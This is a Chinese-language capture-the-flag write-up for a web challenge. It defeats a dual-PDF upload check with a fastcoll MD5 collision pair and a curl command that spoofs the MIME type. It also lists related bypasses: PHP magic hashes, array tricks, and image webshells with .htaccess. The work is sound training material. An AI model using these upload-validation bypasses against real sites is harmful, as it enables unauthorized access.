# WP｜[qsnctf] It is DT's day —— 双文件上传 + MD5 碰撞 + MIME 伪造

> 打题时间：2026-08-10 ｜ 平台：qsnctf ｜ 靶机：http://challenge.qsnctf.com:39929/
> 类型：Web / 文件上传 / MD5 碰撞 / MIME 伪造
> 一句话：**服务器用 MD5 判重、用浏览器传来的 MIME 判类型——两个都能骗。**

---

## 一、题目面貌

- 页面「It is DT's day」，有个**双文件上传表单**（两个 input：`d1`、`d2`），POST 到 `index.php`。
- 提示：`if DT invite you? check it!`；`/flag.php` 直接访问只给「who let you get me indirectly! please get /index.html」（**诱饵**，真正 flag 在通过上传校验后被回显）。
- 环境：`Apache/2.4.56 (Debian)` + `PHP/8.0.30`（这题跟版本无关，别被上一题的版本思路带偏）。

## 二、探测过程（黑盒推断：用报错反推校验规则）

| # | 实验 | 响应 | 推断出的校验 |
|---|---|---|---|
| 1 | 上传两个普通 txt | `Not a PDF! angry!!!!!!` | 有「必须是 PDF」校验 |
| 2 | 上传同一个文件两次（不同文件名） | `Files are not different! check again` | 两个文件**内容必须不同** |
| 3 | 上传两个内容不同的假 PDF（`%PDF-1.4` 开头） | `do you konw what is MD5 Collision?` | 两个文件 **MD5 必须相同** |
| 4 | 用 `;type=application/pdf` 伪造 MIME + 纯文本碰撞对 | **flag 回显** | PDF 校验只看 MIME 类型，不查内容 |

> 关键转折：实验 3 用「`%PDF-` 前缀 + 不同内容」到不了下一步（MD5 不同被拦）→ 所以必须真·MD5 碰撞对；
> 实验 4 发现内容根本不用像 PDF，`;type=application/pdf` 直接骗过类型校验。

## 三、解法（两步）

### 第 1 步：生成 MD5 碰撞对（fastcoll）

```bash
# 本地已备好：my_learning/web/md5coll/ 下有 fastcoll.exe + 现成 m1.bin/m2.bin（同MD5）
# fastcoll 下载源（官网已失效）：github.com/iamjazz/Md5collision 仓库里的 exe
# 任意前缀文件（实测纯文本就行，不需要 %PDF 头）
printf 'AAAABBBBCCCCDDDD' > prefix.bin
fastcoll_v1.0.0.5.exe -p prefix.bin -o m1.bin m2.bin
# 生成 m1.bin / m2.bin：MD5 相同、内容不同
md5sum m1.bin m2.bin   # 两个值一模一样 = 碰撞成功
```

### 第 2 步：上传（关键：伪造 MIME）

```bash
# 用本地现成碰撞对，直接一键复现：
cd my_learning/web/md5coll
curl -F "d1=@m1.bin;filename=a.pdf;type=application/pdf" \
     -F "d2=@m2.bin;filename=b.pdf;type=application/pdf" \
     -F "submit=Uplaod" \
     http://challenge.qsnctf.com:39929/index.php
```

**预期结果**：页面末尾直接出现 flag：
```
flag{38f334ffb26d452e99033ad7fcd4d89d}
```

## 四、原理

1. **三道校验**（服务端，逐一卡你）：
   - ① 两个文件内容不同（防重复）
   - ② 两个文件都「是 PDF」
   - ③ 两个文件 MD5 相同
2. **MD5 碰撞**：MD5 是 128 位摘要，必然存在「不同输入、相同输出」的对（王小云 2004 年给出构造法）。fastcoll 利用「相同前缀 + 两个不同的 64 字节碰撞块」在几秒内生成一对同 MD5 文件。MD5 是 Merkle-Damgård 结构：碰撞块之后内部状态相同，所以**后面再接相同内容，MD5 依然相同**（这就是可以自定义前缀的原理）。
3. **MIME 伪造（这题最骚的点）**：服务端判断「是不是 PDF」用的是 `$_FILES['x']['type']`——这个值**来自浏览器的 multipart 表单，是可以随便改的**。curl 里 `;type=application/pdf` 一行就骗过去了（和「前端校验=纸老虎」同理：信任客户端输入=漏洞）。实测内容完全不 PDF 也能过。
4. 为什么要 MD5 碰撞而不是「随便两个 PDF」：因为②③同时要求「不同内容 + 同 MD5」，非碰撞不可。

## 五、拓展 / 联想

- **现成的碰撞对**：著名的 `hello.exe` / `erase.exe`（同 MD5 的两个 Windows 程序）也能用——改扩展名 + 伪造 MIME 即可（PicoCTF "It is my Birthday" 就这么干）。
- **判断「哪个校验在前面」的方法**：每次只改一个变量做对照实验（先两个都错 → 再逐个改正），就能画出服务端的校验顺序（本题：不同 → PDF → MD5）。
- **同族考点**：
  - PHP 弱比较 `md5(a)==md5(b)`：找 `0e` 开头的魔法字符串（如 `QNKCDZO`、`s878926199a`），`0e...` 全等于 0。
  - PHP 强比较 `md5(a)===md5(b)`：数组绕过（`md5[]=1`）或真碰撞对（上文那串 `M%C9h%FF...`）。
  - 文件上传类题：MIME 伪造、扩展名白名单绕过、图片马 + .htaccess、双写后缀。

## 六、复盘

1. **别被上一题的思路带偏**：上题看版本号（PHP 后门），这题是文件上传——**信息收集每次都要从头做**（表单、参数、提示），不要预设立场。
2. **黑盒推断方法升级**：上传题的「报错信息 = 校验规则说明书」。把每次上传的报错记下来，拼出完整校验链，再逐个击破。
3. **新增套路入库**：
   ```
   双文件上传 + 三个报错(Not a PDF / Not different / MD5 Collision)
   → fastcoll 生成 MD5 碰撞对 + curl -F ";type=application/pdf" 伪造 MIME → flag
   ```
4. **两个「可伪造」的信任点**：浏览器传来的 MIME（`type=`）不可信；MD5 判重不可信（可碰撞）。
5. 这题不需要 getshell——过了校验服务器直接吐 flag，**先试「过校验会怎样」再想打更深的**。
